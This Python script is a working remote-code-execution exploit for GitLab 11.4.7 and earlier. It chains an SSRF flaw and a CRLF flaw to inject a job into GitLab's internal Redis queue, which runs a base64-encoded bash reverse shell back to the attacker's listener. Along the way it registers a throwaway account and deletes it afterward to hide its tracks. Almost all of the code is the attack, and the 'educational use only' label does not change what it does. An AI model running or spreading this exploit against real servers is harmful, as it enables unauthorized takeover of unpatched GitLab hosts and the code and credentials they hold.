"""
Gitlab RCE version <= 11.4.7 - EDUCATIONAL USE ONLY
CVEs: CVE-2018-19571 (SSRF) + CVE-2018-19585 (CRLF)
"""

import base64
from html.parser import HTMLParser
import random
import string
import sys
import time

import requests


class GitlabRCE:
    def __init__(self, gitlab_url, local_ip):
        self.url = gitlab_url
        self.local_ip = local_ip
        self.port = 42069
        self.email_domain = "gmail.com"
        self.session = requests.session()
        self.username = ""
        self.password = ""

    def get_authenticity_token(self, url, i=-1):
        result = self.session.get(url, verify=False)
        parser = GitlabParse()
        token = parser.feed(result.text, i)
        return token

    def randomize(self):
        sequence = string.ascii_letters + string.digits
        random_list = random.choices(sequence, k=10)
        random_string = "".join(random_list)
        return random_string

    def register_user(self):
        authenticity_token = self.get_authenticity_token(self.url + "/users/sign_in")
        self.username = self.randomize()
        self.password = self.randomize()
        email = "{}@{}".format(self.username, self.email_domain)
        data = {"new_user[email]": email, "new_user[email_confirmation]": email, "new_user[username]": self.username,
                "new_user[name]": self.username, "new_user[password]": self.password,
                "authenticity_token": authenticity_token}
        result = self.session.post(self.url + "/users", data=data, verify=False)
        print("registering {}:{} - {}".format(self.username, self.password, result.status_code))

    def login_user(self):
        authenticity_token = self.get_authenticity_token(self.url + "/users/sign_in", 0)
        data = {"authenticity_token": authenticity_token, "user[login]": self.username, "user[password]": self.password}
        result = self.session.post(self.url + "/users/sign_in", data=data, verify=False)
        print(result.status_code)

    def delete_user(self):
        authenticity_token = self.get_authenticity_token(self.url + "/profile/account")
        data = {"authenticity_token": authenticity_token, "_method": "delete", "password": self.password}
        result = self.session.post(self.url + "/users", data=data, verify=False)
        print("delete user {} - {}".format(self.username, result.status_code))

    def exploit_project_creation(self, payload):
        authenticity_token = self.get_authenticity_token(self.url + "/projects/new")
        project = self.randomize()
        payload_template = """git://[0:0:0:0:0:ffff:127.0.0.1]:6379/
 multi
 sadd resque:gitlab:queues system_hook_push
 lpush resque:gitlab:queue:system_hook_push "{\\"class\\":\\"GitlabShellWorker\\",\\"args\\":[\\"class_eval\\",\\"open(\\'|{payload} \\').read\\"],\\"retry\\":3,\\"queue\\":\\"system_hook_push\\",\\"jid\\":\\"ad52abc5641173e217eb2e52\\",\\"created_at\\":1513714403.8122594,\\"enqueued_at\\":1513714403.8129568}"
 exec
 exec
 exec"""
        # using replace for formating is shit!! too bad...
        payload = payload_template.replace("{payload}", payload)
        data = {"authenticity_token": authenticity_token, "project[import_url]": payload,
                "project[ci_cd_only]": "false", "project[name]": project,
                "project[path]": project, "project[visibility_level]": "0",
                "project[description]": "all your base are belong to us"}
        result = self.session.post(self.url + "/projects", data=data, verify=False)
        print("hacking in progress - {}".format(result.status_code))

    def prepare_payload(self):
        payload = "bash -i >& /dev/tcp/{}/{} 0>&1".format(self.local_ip, self.port)
        wrapper = "echo {base64_payload} | base64 -d | /bin/bash"
        base64_payload = base64.b64encode(payload.encode()).decode("utf-8")
        payload = wrapper.format(base64_payload=base64_payload)
        return payload

    def main(self):
        self.register_user()
        self.exploit_project_creation(self.prepare_payload())
        time.sleep(10)
        self.delete_user()


class GitlabParse(HTMLParser):
    def __init__(self):
        super(GitlabParse, self).__init__()
        self.tokens = []
        self.current_name = ""

    def handle_starttag(self, tag, attrs):
        if tag == "input":
            for name, value in attrs:
                if self.current_name == "authenticity_token" and name == "value":
                    self.tokens.append(value)
                self.current_name = value
        elif tag == "meta":
            for name, value in attrs:
                if self.current_name == "csrf-token":
                    self.tokens.append(value)
                self.current_name = value

    def feed(self, data, i):
        super(GitlabParse, self).feed(data)
        return self.tokens[i]


def run():
    args = sys.argv
    if len(args) != 3:
        print("usage: {} target-url(http://gitlab:port) local-ip".format(args[0]))
        return
    else:
        target_url = args[1]
        local_ip = args[2]
        c = GitlabRCE(target_url, local_ip)
        input("Start a listener on port {port} and hit enter (nc -vlnp {port})".format(port=c.port))
        c.main()


run()
